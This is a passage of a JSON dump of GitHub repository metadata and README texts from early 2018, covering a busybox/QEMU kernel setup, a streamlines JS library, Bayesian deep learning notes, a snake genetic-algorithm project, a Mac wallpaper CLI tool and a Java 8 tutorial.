rootfs\n```\n$ cd (project_root)\n$ wget http://busybox.net/downloads/busybox-1.27.2.tar.bz2\n$ tar xf busybox-1.27.2.tar.bz2\n$ cd busybox\n$ make menuconfig\nBusybox Settings ---> Build Options --->Build BusyBox as a static binary (no shared libs)\n$ make -j8\n$ make install\n$ mv _install ../rootfs\n$ cd ../rootfs\n$ find . | cpio -o --format=newc > ../rootfs.img\n$ cd ..\n```\n\n## run\n```\nqemu-system-x86_64 -kernel arch/x86/boot/bzImage -initrd (project_root)/rootfs.img -append \"console=tty0 console=ttyS0,115200 root=/dev/ram rdinit=/bin/sh\" -curses\n```\n\nYou must switch to the serial console monitor with Ctrl+Alt+3.\n","byteSize":1082},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":110},"createdAt":"2018-02-08T18:20:05Z","updatedAt":"2018-02-14T10:13:55Z","pushedAt":"2018-02-10T07:54:38Z","description":null,"subscribersCount":{"totalCount":2},"diskUsage":15170,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":7}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"anvaka","followers":{"totalCount":1032},"repositories":{"totalCount":263},"following":{"totalCount":41},"location":"Seattle ","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":20}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":14}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":88}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":35},"websiteUrl":"http://www.yasiv.com/"},"repository":{"name":"streamlines","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":2,"readme_md":{"text":"# streamlines\n\nThe library builds streamlines for arbitrary vector fields, trying to keep uniform distance\nbetween them.\n\n![demo](https://i.imgur.com/dC5cN8P.gif)\n\n# usage\n\nYou can play with the interactive demo, though keep in mind - it's just a demo created in one night.\nTrue value of this repository is in the library itself :).\n\nDemo is here: https://anvaka.github.io/streamlines\n\n## get it\n\nUse it with your favorite bundler:\n\n```\nnpm install @anvaka/streamlines\n```\n\nOr include a precompiled version:\n\n```\nhttps://cdn.rawgit.com/anvaka/streamlines/v1.0.1/dist/streamlines.min.js\n```\n\nIf you are using precompiled version, it will be available under global name `window.streamlines`.\n\n## use it\n\n``` js\nvar vectorField = p => ({x: -p.y, y: p.x});\n\nstreamlines({\n  vectorField,\n  onPointAdded(from, to) {\n    // called when new point is added to a line\n    console.log('point created', from, to);\n  },\n  onStreamlineAdded(points) {\n    // Points is just a sequence of points with `x, y` coordinates through which\n    // the streamline goes.\n    console.log('stream line created. Number of points: ', points.length)\n  }\n}).run();\n```\n\nThe library allows you to configure various aspects of computation:\n\n``` js\n\nstreamlines({\n  // Vector field is a function that given a point p returns 2d vector\n  // field {x, y}\n  vectorField(p) { return p; },\n\n  // Defines bounding box of the vector field\n  boundingBox: {left: -5, top: -5, width: 10, height: 10},\n\n  // Defines the first point where integration should start. If this is\n  // not specified a random point inside boundingBox is selected\n  seed: {x: -1, y: 1},\n\n  // Separation distance between new streamlines.\n  dSep: 0.5\n\n  // Distance between streamlines when integration should stop.\n  dTest: 0.25,\n\n  // Integration time step (passed to RK4 method.)\n  timeStep: 0.01\n}).run();\n```\n\nThe library does not depend on any particular rendering engine, and can be used in the\nbrowser or node.js environment. However, for your convenience and reference I've added\na [simple canvas renderer](https://github.com/anvaka/streamlines/blob/master/lib/renderTo.js):\n\n``` js\n// Let's assume you have a <canvas id='scene'></canvas> in your document:\nvar canvas = document.getElementById('scene');\n\n// Then you can render to it with this bit of code:\nstreamlines({\n  // As usual, define your vector field:\n  vectorField(p) { return {x: -p.y, y: p.x}; },\n\n  // And print the output to this canvas:\n  onPointAdded: streamlines.renderTo(canvas)\n}).run();\n```\n\n[Here is a JSBin](http://jsbin.com/miwuyav/edit?html,js,output) for you to try.\n\n## Async\n\nThe library is asynchronous in its nature. This is done mostly to give you more control\nover streamline construction process.\n\nThe downside is that it is harder to understand the code. It is written in a way so that\nit can be interrupted at almost every computational step. \n\nIf you want to cancel rendering, call `dispose` method:\n\n``` js\n\nvar renderer = streamlines({vectorField(p) {return p}});\n\n// Launch the construction\nrenderer.run();\n\n// something has happened and you want to stop?\nrenderer.dispose();\n```\n\nIf you want to understand the algorithm, please [read this paper](http://web.cs.ucdavis.edu/~ma/SIGGRAPH02/course23/notes/papers/Jobard.pdf) - the library follows it closely.\n\n# License\n\nMIT\n","byteSize":3300},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":141},"createdAt":"2018-02-08T05:39:07Z","updatedAt":"2018-02-16T08:26:50Z","pushedAt":"2018-02-16T22:26:19Z","description":"Streamlines calculator","subscribersCount":{"totalCount":5},"diskUsage":591,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":23}}},"tags":{"totalCount":7},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"sjchoi86","followers":{"totalCount":689},"repositories":{"totalCount":26},"following":{"totalCount":1},"location":"Seoul","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":7},"websiteUrl":"http://cpslab.snu.ac.kr/people/sungjoon-choi"},"repository":{"name":"bayes-nn","primaryLanguage":null,"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":41,"readme_md":{"text":"# Understanding Bayesian Deep Learning \n\n## 1. Elementary mathematics\n- Set theory\n- Measure theory\n- Probability\n- Random variable\n- Random process\n- Functional analysis (harmonic analysis)\n\n## 2. Gaussian process\n- Gaussian process\n- Weight-space view\n- Function-space view\n- Gaussian process latent variable model \n\n## 3. Bayesian neural netwrok\n- Minimum description length\n- Ensemble learning in Bayesian neural network\n- Practical variational inference\n- Bayes by backprop\n- Summary of variational inference\n- Dropout as a Bayesian approximation\n- Stein variational gradient descent \n\n## 4. Summary\n- Measure thoery\n- Probability\n- Random variable\n- Random process\n- Gaussian process\n- Functional Analysis\n- Summary of variational inference\n- Stein variational gradient descent \n\n## 5. Uncertainty in Deep Learning  \n- Yarin Gal, Uncertainty in Deep Learning\n- Anonymous, Bayesian Uncertainty Estimation for Batch Normalized Deep Networks\n- Patrick McClure, Representing Inferential Uncertainty in Deep Neural Networks through Sampling\n- Balaji Lakshminarayanan, Simple and Scalable Predictive Uncertainty Estimation using Deep Ensembles\n- Alex Kendal, What Uncertainties Do We Need in Bayesian Deep Learning for Computer Vision?\n- Gregory Kahn, Uncertainty-Aware Reinforcement Learning for Collision Avoidance\n- Charles Richter, Safe Visual Navigation via Deep Learning and Novelty Detection\n- Sungjoon Choi, Uncertainty-Aware Learning from Demonstration Using Mixture Density Networks with Sampling-Free Variance Modeling\n","byteSize":1530},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":153},"createdAt":"2018-02-08T16:11:57Z","updatedAt":"2018-02-17T08:28:32Z","pushedAt":"2018-02-11T17:09:24Z","description":"Lecture notes on Bayesian deep learning ","subscribersCount":{"totalCount":15},"diskUsage":23107,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":9}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"sindresorhus","followers":{"totalCount":22412},"repositories":{"totalCount":1248},"following":{"totalCount":45},"location":"° ☾ ☆ ¸. ¸　★  :.　 . • ○ ° ★","organizations":{"totalCount":24},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":10},"stargazers":{"totalCount":22}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":25}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":12}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":13},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":11},"stargazers":{"totalCount":12}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":23}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":16}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":10},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":8},"stargazers":{"totalCount":51}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":8},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":14}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":7},"stargazers":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":24},"stargazers":{"totalCount":424}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":29}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":9},"stargazers":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":59}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":70},"websiteUrl":"https://sindresorhus.com"},"repository":{"name":"modern-normalize","primaryLanguage":{"name":"CSS"},"license":"MIT License","isArchived":false,"hasWikiEnabled":false,"forkCount":22,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":1197},"createdAt":"2018-02-08T05:31:02Z","updatedAt":"2018-02-17T08:46:41Z","pushedAt":"2018-02-11T15:14:03Z","description":"Normalize browsers' default style","subscribersCount":{"totalCount":29},"diskUsage":249,"pullRequestsOpen":{"totalCount":1},"pullRequestsClosed":{"totalCount":2},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":7},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":9},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":6},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":14},"participants":{"totalCount":6}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":8},"participants":{"totalCount":7}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":22}}},"tags":{"totalCount":4},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"Code-Bullet","followers":{"totalCount":16},"repositories":{"totalCount":1},"following":{"totalCount":0},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"SnakeFusion","primaryLanguage":{"name":"Processing"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":14,"readme_md":{"text":"# SnakeFusion\nUsing the genetic algorithm and neural networks I trained up 5 snakes who will then fuse to become the ultimate snake, this is how I did it\n\nThe program I used to write and run this code was processing https://processing.org/download/\n\nIf you get it working some instructions\npress Space to just show the current best from  each population\npress d to double the mutation rate\npress h to halve it \nafter you run it some snakes will be saved press 0 to 4 to check them out\nto further train the snakes of legend (the saved snakes) press L\nto fuse snakes together to create a super snake press f\n\n\nI hope my commenting makes sense \n\nHave fun :)\n","byteSize":655},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":103},"createdAt":"2018-02-07T23:58:42Z","updatedAt":"2018-02-17T08:38:20Z","pushedAt":"2018-02-16T10:49:16Z","description":"Using the genetic algorithm and neural networks I trained up 5 snakes who will then fuse to become the ultimate snake, this is how I did it","subscribersCount":{"totalCount":19},"diskUsage":24,"pullRequestsOpen":{"totalCount":1},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":4}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"xiaobocser","followers":{"totalCount":2},"repositories":{"totalCount":23},"following":{"totalCount":2},"location":"Beijing,CN","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"Mac-command-wallpaper","primaryLanguage":{"name":"Shell"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":3,"readme_md":{"text":"# Mac命令行壁纸（Mac command wallpaper）\n\n![](./source/demonstration.gif)\n\n\n\n## 命令格式\n\n`wallpaper [para1] [para2] [para3]`\n\n## v2.0更新内容\n\n> 为了更方便的使用壁纸切换的命令，做到最精简，出了`Alfred`版本，即`Mac-wallpaper-switcher`。\n>\n> **效果如下**\n\n![](./source/alfred-wallpaper.gif)\n\n> [Mac-wallpaper-switcher 下载地址](https://github.com/xiaobocser/Mac-command-wallpaper/releases/tag/v2.0)\n>\n> 而且，`基础功能`中的很多代码进行了重写，为了保证`无需配置的Mac`可以正常使用，通用性更好。\n>\n> 当然，如果您不需要`Alfred`的`workflow`功能，那么可以继续`更愉快`的使用基础功能 ^ ^\n\n## 基础功能\n\n1. 设定所选图片为壁纸\n\n      `wallpaper YOUR_WALLPAPAER_PATH`\n\n2. 随机网络壁纸（几乎没有重复）\n\n      `wallpaper randweb`\n\n3. 随机本地壁纸\n\n    `wallpaper randlocal`\n\n      > 随机壁纸目录为./background\n\n4. 2018年编程日历壁纸\n\n    > 如图\n\n    ![](./composite/code_calendar_wallpaper_04.jpg)\n\n    ### 简介\n\n    > 拿任何一张你喜欢的`背景图片`和`编程日历`合二为一，生成你的独特桌面背景\n\n    > `编程日历`每周一更；`背景图片`随你所动。\n\n    ![](./source/python_calander.jpg)\n\n    **命令:**\n\n      `wallpaper [para1] com [para3]`\n\n    >  [para1] 可以使用上面1、2、3命令的参数\n\n    > [para3] 0-52整数，代表从这周开始算，生成[para3]周前的编程日历\n\n    *举例:*\n\n     `wallpaper randweb com`\n\n    > 从网络上随机下载壁纸，并生成本周编程日历做壁纸 \n\n     `wallpaper YOUR_WALLPAPAER_PATH com 3`\n\n    > 将你指定的壁纸(建议2560x1600分辨率)，生成3周前的编程日历做壁纸\n\n    *高级用法:*\n\n    > 每周定时生成编程日历壁纸\n\n     `crontab -e`\n\n     `0 12 * * 1 /bin/bash $FILE_PATH/wallpaper randweb com` \n\n    > 每周一中午12点自动从网络随机挑选生成编程日历并作为壁纸\n\n\n5. 命令提示\n\n\t  `wallpaper --h`\n\n6. 原生\n\n    > 如果不使用编程日历功能，全部通过mac的原生命令行完成，无需其它编译安装。\n\n7. 和alfred、launchBar更配哦\n\n## 安装\n\n1. `git clone https://github.com/xiaobocser/Mac-command-wallpaper.git`\n\n2. `bash install.sh`\n\n\n3. 新建窗口并尝试执行 `wallpaper`\n\n\n\n\n--------------------\n\n> ** 如果不使用2018年编程日历壁纸的功能，安装到这里就可以了。需要的同学请进行`依赖安装` **\n\n## 编程日历壁纸功能---依赖安装\n\n> 打开`终端`程序\n\n1. 安装homebrew\n\n\t  `/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"`\n\n2. 安装python\n\n      `brew install python`\n\n3. 安装wand包\n\n\t  `pip install wand`\n\n4. 安装ImageMagick\n\n      `brew install imagemagick@6`\n\n      `export MAGICK_HOME=/usr/local/opt/imagemagick@6`\n\n5. 安装Ghostscript\n\n      `brew install ghostscript`\n\n6. 再次运行`install.sh`\n\n      `bash install.sh`\n\n## 感谢\n\n> V2EX: https://www.v2ex.com/t/427092\n\n> wallhaven: https://alpha.wallhaven.cc/\n","byteSize":3087},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":114},"createdAt":"2018-02-07T08:08:00Z","updatedAt":"2018-02-13T10:01:22Z","pushedAt":"2018-02-09T21:35:11Z","description":"Mac命令行壁纸（Mac command wallpaper）","subscribersCount":{"totalCount":4},"diskUsage":65728,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":4},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":9},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":54}}},"tags":{"totalCount":2},"releases":{"totalCount":1},"type":"user"},"siteAdmin":"false"},{"user":{"login":"biezhi","followers":{"totalCount":2005},"repositories":{"totalCount":66},"following":{"totalCount":61},"location":"Shanghai, China","organizations":{"totalCount":12},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}}],"totalCount":45},"websiteUrl":"https://biezhi.me"},"repository":{"name":"learn-java8","primaryLanguage":{"name":"Java"},"license":"BSD 3-Clause \"New\" or \"Revised\" License","isArchived":false,"hasWikiEnabled":false,"forkCount":3,"readme_md":{"text":"# 跟上 Java 8 教程\n\n这个仓库存储了『跟上Java 8』视频课程源码。\n\nJava8 改变了我们思考和编码的方式，在这里你可以学习到 Java8 中的核心特性以及使用场景，跟我学习 Java8，让你的编程更轻松！\n\n[![Travis Build](https://travis-ci.org/biezhi/learn-java8.svg?branch=master)](https://travis-ci.org/biezhi/learn-java8) \n[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com) \n[![License](https://img.shields.io/badge/license-BSD--3-blue.svg)](https://github.com/biezhi/learn-java8/blob/master/LICENSE)\n[![@biezhi 